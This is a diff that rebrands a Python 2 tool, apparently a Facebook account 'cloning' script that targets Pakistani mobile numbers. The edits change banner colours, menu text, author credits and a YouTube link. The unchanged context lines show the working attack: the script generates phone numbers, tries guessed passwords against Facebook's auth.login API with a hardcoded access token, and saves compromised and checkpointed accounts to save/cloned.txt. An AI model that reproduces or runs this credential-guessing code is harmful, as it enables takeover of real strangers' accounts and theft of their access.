@@ -80,31 +80,33 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\x1b[1;94m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
-\x1b[1;94m██████╦╝██║██║░░░░░███████║██║░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
-\x1b[1;94m██████╦╝██║███████╗██║░░██║███████╗
-\x1b[1;94m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
+\x1b[1;93m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
+\x1b[1;95m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
+\x1b[1;96m██████╦╝██║██║░░░░░███████║██║░░░░░
+\x1b[1;97m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
+\x1b[1;98m██████╦╝██║███████╗██║░░██║███████╗
+\x1b[1;99m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
 """
 
 ####Logo####
 
 logo1 = """
-\x1b[1;94m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
-\x1b[1;94m██████╦╝██║██║░░░░░███████║██║░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
-\x1b[1;94m██████╦╝██║███████╗██║░░██║███████╗
-\x1b[1;94m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
+\x1b[1;93m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
+\x1b[1;95m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
+\x1b[1;96m██████╦╝██║██║░░░░░███████║██║░░░░░
+\x1b[1;97m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
+\x1b[1;98m██████╦╝██║███████╗██║░░██║███████╗
+\x1b[1;99m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
 """
 logo2 = """
-\x1b[1;94m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
-\x1b[1;94m██████╦╝██║██║░░░░░███████║██║░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
-\x1b[1;94m██████╦╝██║███████╗██║░░██║███████╗
-\x1b[1;94m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
+\x1b[1;93m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
+\x1b[1;95m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
+\x1b[1;96m██████╦╝██║██║░░░░░███████║██║░░░░░
+\x1b[1;97m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
+\x1b[1;98m██████╦╝██║███████╗██║░░██║███████╗
+\x1b[1;99m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝
+
+\x1b[1;93mFOR USER NAME NAME PASSWORD CONNECT TO THE SERVER
 """
 CorrectUsername = "B1L4L"
 CorrectPassword = "H41D3R"
@@ -115,15 +117,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m \x1b[1;91mTool Password  \x1b[1;97m» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Majid YAR : SAHU
+            print "Logged in successfully as " + username #B1L4L
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://youtube.com/channel/UCCn7b13eoRh24JeO0gE-0qQ')
+            os.system('xdg-open https://youtube.com/channel/UCnpo3IZafwXQDcWsh67JK-Q')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://youtube.com/channel/UCCn7b13eoRh24JeO0gE-0qQ')
+        os.system('xdg-open https://youtube.com/channel/UCnpo3IZafwXQDcWsh67JK-Q')
 
 
 
@@ -136,11 +138,11 @@ def lisensi():
 def login():
     os.system('clear')
     print logo1
-    print "\033[1;91m[1]\x1b[1;91mSTART ( \033[1;92m NOW)"
+    print "\033[1;91m[1]\x1b[1;91mSTART \033[1;92m (NOW)"
     time.sleep(0.05)
     print "\033[1;95m[2]\x1b[1;94mUPDATE (9.0)"
     time.sleep(0.05)
-    print '\x1b[1;94m[0]\033[1;91m Exit ( Back)'
+    print '\x1b[1;94m[0]\033[1;91m Exit (Back)'
     pilih_login()
 
 def pilih_login():
@@ -153,9 +155,9 @@ def pilih_login():
 def Zeek():
     os.system('clear')
     print logo1
-    print '\x1b[1;91m[1]  START CLONING'
+    print '\x1b[1;91m[1] START CLONING'
     time.sleep(0.10)
-    print '\x1b[1;93m[0] back'
+    print '\x1b[1;93m[0] BACK'
    
     time.sleep(0.05)
     action()
@@ -170,9 +172,9 @@ def action():
         print logo2
         print "Enter any Pakistan Mobile code Number"+'\n'
         print '\x1b[1;91mEnter any code 01 to 49'
-        print '\x1b[1;92mtelenor.\x1b[1;91mjazz.\x1b[1;93mzong.\x1b[1;95mwarid.UFUNE'
+        print '\x1b[1;92m[TELENOR]\x1b[1;91m[JAAZ]\x1b[1;93m[ZONG]\x1b[1;95m[UFUNE]'
         try:
-            c = raw_input("\033[1;97mCHOOSE : ")
+            c = raw_input("\033[1;97mᗷƖᒪᗩᒪ-᙭ᗪ➤ ")
             k="03"
             idlist = ('.txt')
             for line in open(idlist,"r").readlines():
@@ -229,7 +231,7 @@ def action():
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;97m(\x1b[1;93m  CP ) ' + k + c + user + '  |  ' + pass2
+                            print '\033[1;97m(\x1b[1;93mCP) ' + k + c + user + '  |  ' + pass2
                             cps = open('save/cloned.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -273,7 +275,7 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;93m(ok)  ' + k + c + user + '  |  ' + pass5
+                                                print '\x1b[1;93m(OK)  ' + k + c + user + '  |  ' + pass5
                                                 okb = open('save/cloned.txt', 'a')
                                                 okb.write(k+c+user+pass5+'\n')
                                                 okb.close()
